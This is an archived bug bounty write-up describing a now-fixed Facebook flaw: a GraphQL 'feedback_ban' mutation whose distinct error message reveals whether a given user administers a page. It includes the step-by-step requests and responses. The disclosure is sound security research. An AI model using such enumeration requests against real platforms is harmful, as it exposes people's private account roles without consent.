---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-11-15_disclose-page-admins-via-gaming-dashboard-bans.md
original_filename: 2018-11-15_disclose-page-admins-via-gaming-dashboard-bans.md
title: Disclose Page Admins via Gaming Dashboard Bans
category: documents
detected_topics:
- command-injection
- otp
- graphql
- information-disclosure
tags:
- imported
- documents
- command-injection
- otp
- graphql
- information-disclosure
language: en
raw_sha256: d4124293924dc50787726844c99667647245277df8b8a9a51a755a80ec386def
text_sha256: abc531991fe3a07eaa4029c1873684e10561e425946c98c03185552fd0e1aa70
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# Disclose Page Admins via Gaming Dashboard Bans

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-11-15_disclose-page-admins-via-gaming-dashboard-bans.md
- Source Type: markdown
- Detected Topics: command-injection, otp, graphql, information-disclosure
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `d4124293924dc50787726844c99667647245277df8b8a9a51a755a80ec386def`
- Text SHA256: `abc531991fe3a07eaa4029c1873684e10561e425946c98c03185552fd0e1aa70`


## Content

---
title: "Disclose Page Admins via Gaming Dashboard Bans"
page_title: "Disclose Page Admins via Gaming Dashboard Bans - These aren't the access_tokens you're looking for"
url: "https://philippeharewood.com/disclose-page-admins-via-gaming-dashboard-bans/"
final_url: "https://philippeharewood.com/disclose-page-admins-via-gaming-dashboard-bans/"
authors: ["Philippe Harewood (@phwd)"]
programs: ["Meta / Facebook"]
bugs: ["Information disclosure"]
publication_date: "2018-11-15"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5587
---

Posted on [July 24, 2018](https://philippeharewood.com/disclose-page-admins-via-gaming-dashboard-bans/)

# Disclose Page Admins via Gaming Dashboard Bans

[Facebook Gaming](https://www.facebook.com/gaming/) is a relatively new section for streamers to present live gameplay for Facebook viewers. Streamers can choose to ban certain viewers from commenting on live videos. It is possible to use this feature to infer page admins.  
1\. Get a valid video broadcast ID. This should be possible by calling `/me/video_broadcasts` or `/page_id/video_broadcasts` in GraphAPI
  
  
  HTTP GET
  https://graph.facebook.com/me/video_broadcasts?access_token=ZDZD
  

2\. Execute a GraphQL mutation call as the malicious user to feedback_ban with the following settings  
`streamer_id=PAGE_ID` (The page to disclose the admin)  
`target_user_id=TARGET_1` (A user believed to be an admin)  
Request
  
  
  HTTP POST
  graph.facebook.com/graphql
  doc_id=1
  variables={input:{client_mutation_id:0,actor_id:13608786,streamer_id:PAGE_ID,target_user_id:TARGET_1,broadcast_id:BROADCAST_ID,ban_action:'BAN'}}
  

Response
  
  
  {"data": {
  "feedback_ban": null
  },
  "errors": [
  {
  "message": "Errors while executing operation \"GamesVideoStreamerDashboardBanUserMutation\": At Mutation.feedback_ban: Field implementation threw an exception. Check your server logs for more information.",
  "severity": "CRITICAL",
  "code": 1357039,
  "api_error_code": 100,
  "summary": "Removing or banning Page admins is not allowed",
  "description": "This person can’t be banned.This person helps manage this Page and must be removed from their role before you can ban them.",
  "is_silent": false,
  "is_transient": false,
  "requires_reauth": false,
  "allow_user_retry": false,
  "debug_info": null,
  "query_path": null,
  "fbtrace_id": "A"
  }]}
  

As opposed to a user who does not have a role  
`streamer_id=PAGE_ID` (The page to disclose the admin)  
`target_user_id=TARGET_2` (A user who is not an admin)  
Request
  
  
  HTTP POST
  graph.facebook.com/graphql
  doc_id=1
  variables={input:{client_mutation_id:0,actor_id:13608786,streamer_id:PAGE_ID,target_user_id:TARGET_2,broadcast_id:BROADCAST_ID,ban_action:'BAN'}}
  

Response
  
  
  {"data": {
  "feedback_ban": {
  "client_mutation_id": "0",
  "client_subscription_id": null
  }}}

The page admin is known based on the difference in responses as well as being explicitly stated in the error message “Removing or banning Page admins is not allowed”.  
**Impact**  
This could potentially let an attacker infer whether a user has a role on a specific page.  
**Timeline**  
Jul 24, 2018 – Report Sent  
Jul 24, 2018 – Further investigation by Facebook  
Nov 2, 2018 – Fixed by Facebook  
Nov 13, 2018 – Bounty Awarded by Facebook
